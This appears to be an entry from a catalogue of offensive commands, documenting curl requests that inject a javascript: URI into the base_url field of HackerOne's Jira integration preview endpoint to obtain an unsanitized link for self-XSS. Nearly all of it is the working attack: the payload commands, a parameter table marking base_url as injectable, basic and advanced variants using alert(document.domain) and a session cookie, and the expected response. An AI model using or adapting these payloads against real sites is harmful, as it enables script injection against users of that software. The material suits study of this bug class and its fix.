---
id: cmd-uuid-1
data: >-
  curl -X POST https://hackerone.com/[program]/jira_integrations/preview -d
  "pid=123&issue_type=1&base_url=javascript://alert(1)%3B@&summary={{title}}&description={{details_truncated}}+{{1+1}}+#{1+1}&labels=HackerOne&assignee=&custom=test=1"
tags:
  - xss
  - preview
  - ajax
type: command
output: >-
  {"preview":{"example_escalation_url":"javascript:alert(1);@/secure/CreateIssueDetails!init.jspa?assignee=\u0026description=%7B%7Bdetails_truncated%7D%7D+%7B%7B1+1%7D%7D+%23%7B1+1%7D\u0026issuetype=1\u0026labels=HackerOne\u0026pid=123\u0026summary=%7B%7Btitle%7D%7D\u0026test=1"}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:39.190Z'
verified: false
validated: true
submitted: true
---
# hackerone-jira-preview-post

## Command

```bash
curl -X POST https://hackerone.com/[program]/jira_integrations/preview -d "pid=123&issue_type=1&base_url=javascript://alert(1)%3B@&summary={{title}}&description={{details_truncated}}+{{1+1}}+#{1+1}&labels=HackerOne&assignee=&custom=test=1"
```

## Description

This command sends an AJAX POST request to the HackerOne Jira integration preview endpoint, injecting a malicious javascript: URI into the base_url parameter to generate a response containing an unsanitized example_escalation_url that can be used for self-XSS exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pid | Program ID (e.g., 123) | Yes |
| issue_type | Issue type ID (e.g., 1) | Yes |
| base_url | Base URL for integration, injectable with javascript: payload | Yes |
| summary | Template for issue summary (e.g., {{title}}) | Yes |
| description | Template for issue description with probes | Yes |
| labels | Labels for the issue (e.g., HackerOne) | Yes |
| assignee | Assignee username (can be empty) | No |
| custom | Custom fields (e.g., test=1) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/buer_haus/jira_integrations/preview -d "pid=123&base_url=javascript://alert(1)%3B@"
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/[program]/jira_integrations/preview -d "pid=123&issue_type=1&base_url=javascript://alert(document.domain);%2f%2f@&summary={{title}}&description={{details_truncated}}&labels=HackerOne&custom=test=1" -H "Cookie: your_session_cookie"
```

## Expected Output

JSON response with the preview object containing example_escalation_url that embeds the injected javascript: URI, ready for rendering as a clickable link.

## Related

- [[Related Procedure|procedures/Exploit-Self-XSS-in-Jira-Integration-Base-URL]]
